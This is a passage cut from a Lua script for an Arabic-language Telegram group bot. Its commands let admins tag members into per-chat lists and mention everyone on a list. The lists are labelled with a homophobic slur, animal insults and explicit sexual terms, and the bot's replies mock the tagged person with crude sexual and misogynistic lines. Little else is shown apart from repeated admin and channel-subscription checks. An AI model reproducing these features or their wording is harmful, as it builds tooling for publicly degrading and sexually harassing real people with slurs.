if text == 'مسح الخولات' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Modde:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم مسح كل الخولات')
end
if text == ("تاك للخولات") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
t = "\n⋄قائمه خولات الجروب \nٴ•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."»> الخول [@"..username.."]\n"
else
t = t..""..k.."»> الخول `"..v.."`\n"
end
end
if #list == 0 then
t = " ⋄مع الاسف لا يوجد خولات غيرك هنا"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع خول") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Modde:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضــو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n⋄تم رفع العضــو خول في الجروب \n⋄خد يخول يبن المره الغداره'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل خول")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Modde:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضــو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيل العضــو الخول من الجروب\n⋄ارفعو تاني لحسن ارفعك مكانو'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل الصخوله' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Sakl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم تنزيل جميع صخوله من الجروب')
end
if text == ("تاك للصخوله") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
t = "\n⋄قائمة صخوله الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."»> الصخل [@"..username.."]\n"
else
t = t..""..k.."»> الصخل `"..v.."`\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد صخل"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع صخل") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Sakl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
local  statuss  = '\n⋄تم رفع المتهم صخل بالجروب\n⋄الان اصبح صخل الجروب'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if (text == ("تنزيل صخل")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Sakl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيل العضو صخل\n⋄ارجع للبيتكم حبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الكلاب' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Motte:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم مسج كل كلاب الجروب')
end
if text == ("تاك للكلاب") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
t = "\n⋄قائمة كلاب الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."»> الكلب [@"..username.."]\n"
else
t = t..""..k.."»> الكلب `"..v.."`\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد كلاب غيرك"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع كلب") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Motte:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
local  statuss  = '\n⋄تم رفع كلب في الجروب\n⋄تعال حبي اطيك عضمه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل كلب")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Motte:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيل كلب في الجروب\n⋄تعال خد عضمه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل القروده' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Motee:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم تنزيل جميع القروده بالجروب')
end
if text == ("تاك للقروده") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
t = "\n⋄قائمة القروده الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."»> القرد [@"..username.."]\n"
else
t = t..""..k.."»> القرد `"..v.."`\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد قرد"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع قرد") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
local  statuss  = '\n⋄تم رفع قرد في الجروب\n⋄تعال حبي استلم موزه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل قرد")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيل قرد من الجروب\n⋄رجع موزه حبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل الضلوع' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Bro:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم تنزيل جميع الضلوع بالجروب')
end
if text == ("تاك للضلوع") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Bro:User'..msg.chat_id_)
t = "\n⋄قائمة الضلوع الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."»> الضلع [@"..username.."]\n"
else
t = t..""..k.."»> الضلع `"..v.."`\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد ضلع"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع ضلع") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Bro:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
local  statuss  = '\n⋄تم رفع ضلع في الجروب\n⋄تعال حبيبي انت صرت من الضلوع حظر روحك منا ورايح نطلع سفرات للجزيره والزورا ونشرب عرك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل ضلع")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Bro:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيل ضلع من الجروب\n⋄بعد لتراويني وجهك ياحقير وجيب فلوس الشرب'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح النسوان' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Girl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم مسح كل النسوان بالجروب')
end
if text == ("تاك للنسوان") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
t = "\n⋄قائمة نسوان الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."»> المره [@"..username.."]\n"
else
t = t..""..k.."»> المره `"..v.."`\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد نسوان غيرك"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع مره") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
local  statuss  = '\n⋄تم رفع مره في الجروب\n⋄ها صرتي من نسواني تعي ندخل'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل مره")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيل مره من الجروب\n⋄بتاعي غضبان عليكي ليوم الدين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح المتناكين' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Nek:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم مسح كل متناكين الجروب')
end
if text == ("تاك للمتناكين") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Nek:User'..msg.chat_id_)
t = "\n⋄قائمة متناكين الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."»> المتناكه [@"..username.."]\n"
else
t = t..""..k.."»> المتناكه `"..v.."`\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد متناكين غيرك"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع علي زبي") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Nek:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
local  statuss  = '\n⋄تم رفع العضو علي زبك في الجروب\n⋄تفضل ابدا نيك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل من زبي")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Nek:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيل العضو من زبك بنجاح\n⋄وقف نيك مؤقتا'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الاكساس' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'kss:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم مسح كل الاكساس بالجروب')
end
if text == ("تاك للاكساس") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'kss:User'..msg.chat_id_)
t = "\n⋄قائمة اكساس الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."»> الكس [@"..username.."]\n"
else
t = t..""..k.."»> الكس `"..v.."`\n"
end
end
